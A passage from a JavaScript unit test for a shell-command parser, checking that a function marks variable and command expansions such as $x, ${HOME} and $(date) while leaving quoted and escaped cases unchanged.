    for (const c of ["git clean $x", "echo \"$(cat <<'EOF'\nit's $x\nEOF\n)\"", "awk '{print $1}' f", "make -j$(nproc)", "echo ${HOME} $HOME", "cat <<EOF\n$(date) $x\nEOF", "echo \\$x '$y' # $z"]) {
      const marked = markExpansions(c);
      assert.equal(strip(marked), c, c);
      assert.deepEqual(parse(marked).cmds.map((x) => x.argv.map(strip)), parse(c).cmds.map((x) => x.argv), c);
    }
    assert.equal(markExpansions("awk '{print $1}' f"), "awk '{print $1}' f");
    assert.equal(markExpansions("echo \\$x '$y' # $z"), "echo \\$x '$y' # $z");
    assert.ok(markExpansions("git clean $x").includes("\u000e$x"));
    assert.ok(markExpansions("git log \"$b\"").includes("\u000f$b"));
  });
});
